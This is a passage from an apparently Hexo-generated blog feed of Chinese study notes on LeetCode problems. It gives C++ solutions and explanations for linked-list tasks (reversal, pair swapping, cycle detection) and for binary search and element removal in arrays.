class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLinkedList</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> _size;<br>    LinkedNode* _dummyHead;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 定义链表节点结构体</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LinkedNode</span> &#123;<br>        <span class="hljs-type">int</span> val;<br>        LinkedNode* next;<br>        <span class="hljs-built_in">LinkedNode</span>(<span class="hljs-type">int</span> val):<span class="hljs-built_in">val</span>(val), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>)&#123;&#125;<br>    &#125;;<br><br>    <span class="hljs-comment">// 初始化链表</span><br>    <span class="hljs-built_in">MyLinkedList</span>() &#123;<br>        _dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LinkedNode</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 这里定义的头结点 是一个虚拟头结点，而不是真正的链表头结点</span><br>        _size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取到第index个节点数值，如果index是非法数值直接返回-1， 注意index是从0开始的，第0个节点就是头结点</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &gt; (_size - <span class="hljs-number">1</span>) || index &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        LinkedNode* cur = _dummyHead-&gt;next;<br>        <span class="hljs-keyword">while</span>(index--)&#123; <span class="hljs-comment">// 如果--index 就会陷入死循环</span><br>            cur = cur-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cur-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">// 在链表最前面插入一个节点，插入完成后，新插入的节点为链表的新的头结点</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtHead</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123;<br>        LinkedNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LinkedNode</span>(val);<br>        newNode-&gt;next = _dummyHead-&gt;next;<br>        _dummyHead-&gt;next = newNode;<br>        _size++;<br>    &#125;<br><br>    <span class="hljs-comment">// 在链表最后面添加一个节点</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtTail</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> </span>&#123;<br>        LinkedNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LinkedNode</span>(val);<br>        LinkedNode* cur = _dummyHead;<br>        <span class="hljs-keyword">while</span>(cur-&gt;next != <span class="hljs-literal">nullptr</span>)&#123;<br>            cur = cur-&gt;next;<br>        &#125;<br>        cur-&gt;next = newNode;<br>        _size++;<br>    &#125;<br><br>    <span class="hljs-comment">// 在第index个节点之前插入一个新节点，例如index为0，那么新插入的节点为链表的新头节点。</span><br>    <span class="hljs-comment">// 如果index 等于链表的长度，则说明是新插入的节点为链表的尾结点</span><br>    <span class="hljs-comment">// 如果index大于链表的长度，则返回空</span><br>    <span class="hljs-comment">// 如果index小于0，则置为0，作为链表的新头节点。</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addAtIndex</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &gt; _size || index &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        LinkedNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">LinkedNode</span>(val);<br>        LinkedNode* cur = _dummyHead;<br>        <span class="hljs-keyword">while</span>(index--) &#123;<br>            cur = cur-&gt;next;<br>        &#125;<br>        newNode-&gt;next = cur-&gt;next;<br>        cur-&gt;next = newNode;<br>        _size++;<br>    &#125;<br><br>    <span class="hljs-comment">// 删除第index个节点，如果index 大于等于链表的长度，直接return，注意index是从0开始的</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteAtIndex</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index &gt;= _size || index &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        LinkedNode* cur = _dummyHead;<br>        <span class="hljs-keyword">while</span>(index--) &#123;<br>            cur = cur -&gt;next;<br>        &#125;<br>        LinkedNode* tmp = cur-&gt;next;<br>        cur-&gt;next = cur-&gt;next-&gt;next;<br>        <span class="hljs-keyword">delete</span> tmp;<br>        _size--;<br>    &#125;<br><br>    <span class="hljs-comment">// 打印链表</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printLinkedList</span><span class="hljs-params">()</span> </span>&#123;<br>        LinkedNode* cur = _dummyHead;<br>        <span class="hljs-keyword">while</span> (cur-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            cout &lt;&lt; cur-&gt;next-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>            cur = cur-&gt;next;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="反转链表">反转链表</h1><p><a href="https://leetcode.cn/problems/reverse-linked-list/">206.反转链表 - 力扣（LeetCode）</a></p><ul><li><p>双指针法</p><ul><li>```c++ class Solution { public: ListNode* reverseList(ListNode*head) { ListNode* temp; // 保存cur的下一个节点 ListNode* cur = head;ListNode* pre = NULL; while(cur) { temp = cur-&gt;next; // 保存一下cur的下一个节点，因为接下来要改变cur-&gt;next cur-&gt;next = pre; //翻转操作 // 更新pre 和 cur指针 pre = cur; cur = temp; } return pre; } };<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>- 递归<br><br>  - ```c++<br>    <span class="hljs-keyword">class</span> Solution &#123;<br>    <span class="hljs-keyword">public</span>:<br>        ListNode* <span class="hljs-keyword">reverse</span>(ListNode* pre,ListNode* cur)&#123;<br>            <span class="hljs-keyword">if</span>(cur == <span class="hljs-keyword">NULL</span>) <span class="hljs-keyword">return</span> pre;<br>            ListNode* temp = cur-&gt;<span class="hljs-keyword">next</span>;<br>            cur-&gt;<span class="hljs-keyword">next</span> = pre;<br>            <span class="hljs-comment">// 可以和双指针法的代码进行对比，如下递归的写法，其实就是做了这两步</span><br>            <span class="hljs-comment">// pre = cur;</span><br>            <span class="hljs-comment">// cur = temp;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">reverse</span>(cur,temp);<br>        &#125;<br>        ListNode* reverseList(ListNode* head) &#123;<br>             <span class="hljs-comment">// 和双指针法初始化是一样的逻辑</span><br>            <span class="hljs-comment">// ListNode* cur = head;</span><br>            <span class="hljs-comment">// ListNode* pre = NULL;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">reverse</span>(<span class="hljs-keyword">NULL</span>, head);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="两两交换链表中的节点">两两交换链表中的节点</h1><p><a href="https://leetcode.cn/problems/swap-nodes-in-pairs/">24.两两交换链表中的节点 - 力扣（LeetCode）</a></p><ul><li><p>初始时<img src="/2022/09/05/Algorithm/algorithm-2/image-20220908134421265.png" class="" title="image-20220908134421265"></p></li><li><p>操作之后</p><img src="/2022/09/05/Algorithm/algorithm-2/image-20220908134500203.png" class="" title="image-20220908134500203"></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">swapPairs</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置一个虚拟头结点</span><br>        dummyHead-&gt;next = head; <span class="hljs-comment">// 将虚拟头结点指向head，这样方面后面做删除操作</span><br>        ListNode* cur = dummyHead;<br>        <span class="hljs-keyword">while</span>(cur-&gt;next != <span class="hljs-literal">nullptr</span> &amp;&amp; cur-&gt;next-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            ListNode* tmp = cur-&gt;next; <span class="hljs-comment">// 记录临时节点</span><br>            ListNode* tmp1 = cur-&gt;next-&gt;next-&gt;next; <span class="hljs-comment">// 记录临时节点</span><br><br>            cur-&gt;next = cur-&gt;next-&gt;next;    <span class="hljs-comment">// 步骤一</span><br>            cur-&gt;next-&gt;next = tmp;          <span class="hljs-comment">// 步骤二</span><br>            cur-&gt;next-&gt;next-&gt;next = tmp1;   <span class="hljs-comment">// 步骤三</span><br><br>            cur = cur-&gt;next-&gt;next; <span class="hljs-comment">// cur移动两位，准备下一轮交换</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="删除链表的倒数第n个节点">删除链表的倒数第N个节点</h1><p><ahref="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/">19.删除链表的倒数第 N 个结点 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>        dummyHead-&gt;next = head;<br>        ListNode* slow = dummyHead;<br>        ListNode* fast = dummyHead;<br>        <span class="hljs-keyword">while</span>(n-- &amp;&amp; fast != <span class="hljs-literal">NULL</span>) &#123;<br>            fast = fast-&gt;next;<br>        &#125;<br>        fast = fast-&gt;next; <span class="hljs-comment">// fast再提前走一步，因为需要让slow指向删除节点的上一个节点</span><br>        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span>) &#123;<br>            fast = fast-&gt;next;<br>            slow = slow-&gt;next;<br>        &#125;<br>        slow-&gt;next = slow-&gt;next-&gt;next;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表相交">链表相交</h1><p><ahref="https://leetcode.cn/problems/intersection-of-two-linked-lists-lcci/">面试题02.07. 链表相交 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        ListNode* curA = headA;<br>        ListNode* curB = headB;<br>        <span class="hljs-type">int</span> lenA = <span class="hljs-number">0</span>, lenB = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (curA != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 求链表A的长度</span><br>            lenA++;<br>            curA = curA-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (curB != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 求链表B的长度</span><br>            lenB++;<br>            curB = curB-&gt;next;<br>        &#125;<br>        curA = headA;<br>        curB = headB;<br>        <span class="hljs-comment">// 让curA为最长链表的头，lenA为其长度</span><br>        <span class="hljs-keyword">if</span> (lenB &gt; lenA) &#123;<br>            <span class="hljs-built_in">swap</span> (lenA, lenB);<br>            <span class="hljs-built_in">swap</span> (curA, curB);<br>        &#125;<br>        <span class="hljs-comment">// 求长度差</span><br>        <span class="hljs-type">int</span> gap = lenA - lenB;<br>        <span class="hljs-comment">// 让curA和curB在同一起点上（末尾位置对齐）</span><br>        <span class="hljs-keyword">while</span> (gap--) &#123;<br>            curA = curA-&gt;next;<br>        &#125;<br>        <span class="hljs-comment">// 遍历curA 和 curB，遇到相同则直接返回</span><br>        <span class="hljs-keyword">while</span> (curA != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (curA == curB) &#123;<br>                <span class="hljs-keyword">return</span> curA;<br>            &#125;<br>            curA = curA-&gt;next;<br>            curB = curB-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="环形链表">环形链表</h1><p><a href="https://leetcode.cn/problems/linked-list-cycle-ii/">142.环形链表 II - 力扣（LeetCode）</a></p><h2 id="判断链表是否有环">判断链表是否有环</h2><p>使用快慢指针法，分别定义fast和slow指针，从头结点出发，fast指针每次移动两个节点，slow指针每次移动一个节点，如果fast 和 slow指针在途中相遇 ，说明这个链表有环。</p><ul><li><p><strong>fast指针一定先进入环中，如果fast指针和slow指针相遇的话，一定是在环中相遇</strong></p></li><li><p><strong>有环时两者一定会相遇</strong></p><img src="/2022/09/05/Algorithm/algorithm-2/008eGmZEly1goo4xglk9yg30fs0b6u0x.gif" class="" title="141.环形链表"></li></ul><h2id="如果有环如何找到这个环的入口">如果有环，如何找到这个环的入口</h2><p>假设从头结点到环形入口节点 的节点数为x。 环形入口节点到fast指针与slow指针相遇节点 节点数为y。 从相遇节点再到环形入口节点节点数为 z。</p><img src="/2022/09/05/Algorithm/algorithm-2/20210318162938397.png" class="" title="142环形链表2"><ul><li>slow指针走过的节点数：<code>x+y</code></li><li>fast指针走过的节点数：<code>x+y+n(y+z)</code>，<code>n</code>为fast走过的圈数</li><li>slow * 2 == fast，即可以得到<code>x+y = n(y+z)</code>，可得<code>x = n (y + z) - y</code></li><li>当<code>n = 1</code>时</li></ul><figure><imgsrc="https://tva1.sinaimg.cn/large/008eGmZEly1goo58gauidg30fw0bi4qr.gif"alt="142.环形链表II（求入口）" /><figcaption aria-hidden="true">142.环形链表II（求入口）</figcaption></figure><ul><li>当 <code>n &gt; 1</code>的情况与<code>n = 1</code>类似，只是fast指针环中转了<code>n</code>圈</li></ul><h2id="slow的步数是xy而不是x-若干环的长度-y">slow的步数是<code>x+y</code>而不是<code>x + 若干环的长度 + y</code></h2><p>首先slow进环的时候，fast一定是先进环来了。</p><p>如果slow进环入口，fast也在环入口，那么把这个环展开成直线，就是如下图的样子</p><img src="/2022/09/05/Algorithm/algorithm-2/2021031816503266.png" class="" title="142环形链表3"><p>可以看出如果slow 和fast同时在环入口开始走，一定会在环入口3相遇，slow走了一圈，fast走了两圈。</p><p>重点来了，slow进环的时候，fast一定是在环的任意一个位置，如图：</p><img src="/2022/09/05/Algorithm/algorithm-2/2021031816515727.png" class="" title="142环形链表4"><p>那么fast指针走到环入口3的时候，已经走了k + n个节点，slow相应的应该走了(k + n) / 2 个节点。</p><p>因为k是小于n的（图中可以看出），所以(k + n) / 2 一定小于n。</p><p><strong>也就是说slow一定没有走到环入口3，而fast已经到环入口3了</strong>。</p><p>这说明什么呢？</p><p><strong>在slow开始走的那一环已经和fast相遇了</strong>。</p><p>假设Faster确实把Slower超了而且他俩还没相遇（类似Faster一下迈了2步，Slower一下迈了一步，Faster超了Slower，但是俩人并没遇上）。那么就假设Faster现在在i+1 位置而Slower在 i 位置。那么前一时刻，Slower肯定是在 i-1位置，而Faster肯定在(i+1)-2位置，所以前一时刻，俩人都在 i-1位置，相遇了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        ListNode* fast = head;<br>        ListNode* slow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>            <span class="hljs-comment">// 快慢指针相遇，此时从head 和 相遇点，同时查找直至相遇</span><br>            <span class="hljs-keyword">if</span> (slow == fast) &#123;<br>                ListNode* index1 = fast;<br>                ListNode* index2 = head;<br>                <span class="hljs-keyword">while</span> (index1 != index2) &#123;<br>                    index1 = index1-&gt;next;<br>                    index2 = index2-&gt;next;<br>                &#125;<br>                <span class="hljs-keyword">return</span> index2; <span class="hljs-comment">// 返回环的入口</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="总结">总结</h1>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组</title>
    <link href="/2022/06/26/Algorithm/algorithm-1/"/>
    <url>/2022/06/26/Algorithm/algorithm-1/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="数组">数组</h1><h2 id="二分查找">二分查找</h2><h3 id="二分查找---力扣leetcode"><ahref="https://leetcode.cn/problems/binary-search/">704. 二分查找 -力扣（LeetCode）</a></h3><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回-1。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入: nums = [-1,0,3,5,9,12], target =<span class="hljs-number"> 9 </span>    <br>输出:<span class="hljs-number"> 4 </span>      <br>解释:<span class="hljs-number"> 9 </span>出现在 nums 中并且下标为<span class="hljs-number"> 4 </span><br></code></pre></td></tr></table></figure><h4 id="思路">思路</h4><p>二分法应当注意对<strong>区间的定义。区间的定义就是不变量</strong>，要在二分查找的过程中，保持不变量，就是在while寻找每一次边界的处理都要坚持根据区间的定义来操作，这就是<strong>循环不变量</strong>规则。</p><p>二分法区间的定义一般为两种，左闭右闭 [left, right]，或者左闭右开[left, right)。</p><span id="more"></span><ul><li><p>[left, right]</p><ul><li>while (left &lt;= right) 要使用 &lt;= ，因为left ==right是有意义的，所以使用 &lt;=</li><li>if (nums[middle] &gt; target) right 要赋值为 middle -1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是middle - 1</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; <span class="hljs-comment">// 定义target在左闭右闭的区间里，[left, right]</span><br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123; <span class="hljs-comment">// 当left==right，区间[left, right]依然有效，所以用 &lt;=</span><br>            <span class="hljs-type">int</span> middle = left + ((right - left) / <span class="hljs-number">2</span>);<span class="hljs-comment">// 防止溢出 等同于(left + right)/2</span><br>            <span class="hljs-keyword">if</span> (nums[middle] &gt; target) &#123;<br>                right = middle - <span class="hljs-number">1</span>; <span class="hljs-comment">// target 在左区间，所以[left, middle - 1]</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[middle] &lt; target) &#123;<br>                left = middle + <span class="hljs-number">1</span>; <span class="hljs-comment">// target 在右区间，所以[middle + 1, right]</span><br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// nums[middle] == target</span><br>                <span class="hljs-keyword">return</span> middle; <span class="hljs-comment">// 数组中找到目标值，直接返回下标</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 未找到目标值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>[left, right)</p><ul><li>while (left &lt; right)，这里使用 &lt; ,因为left ==right在区间[left, right)是没有意义的</li><li>if (nums[middle] &gt; target) right 更新为middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle]</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>(); <span class="hljs-comment">// 定义target在左闭右开的区间里，即：[left, right)</span><br>        <span class="hljs-keyword">while</span> (left &lt; right) &#123; <span class="hljs-comment">// 因为left == right的时候，在[left, right)是无效的空间，所以使用 &lt;</span><br>            <span class="hljs-type">int</span> middle = left + ((right - left) &gt;&gt; <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (nums[middle] &gt; target) &#123;<br>                right = middle; <span class="hljs-comment">// target 在左区间，在[left, middle)中</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[middle] &lt; target) &#123;<br>                left = middle + <span class="hljs-number">1</span>; <span class="hljs-comment">// target 在右区间，在[middle + 1, right)中</span><br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// nums[middle] == target</span><br>                <span class="hljs-keyword">return</span> middle; <span class="hljs-comment">// 数组中找到目标值，直接返回下标</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 未找到目标值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h3 id="相关题目">相关题目</h3><p><ahref="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/">34.在排序数组中查找元素的第一个和最后一个位置 - 力扣（LeetCode）</a></p><p><ahref="https://leetcode.cn/problems/search-insert-position/submissions/">35.搜索插入位置 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/sqrtx/">69. x 的平方根 -力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/valid-perfect-square/">367.有效的完全平方数 - 力扣（LeetCode）</a></p><h2 id="移除元素">移除元素</h2><h3 id="移除元素---力扣leetcode"><ahref="https://leetcode.cn/problems/remove-element/">27. 移除元素 -力扣（LeetCode）</a></h3><h4 id="思路-1">思路</h4><p>双指针法（快慢指针法）：<strong>通过一个快指针和慢指针在一个for循环下完成两个for循环的工作。</strong></p><ul><li>快指针：寻找新数组的元素，新数组就是不含有目标元素的数组</li><li>慢指针：指向更新新数组下标的位置</li></ul><img src="/2022/06/26/Algorithm/algorithm-1/008eGmZEly1gntrds6r59g30du09mnpd.gif" class="" title="27.移除元素-双指针法"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 时间复杂度：O(n)</span><br><span class="hljs-comment">// 空间复杂度：O(1)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slowIndex = <span class="hljs-number">0</span>;<br>        <span 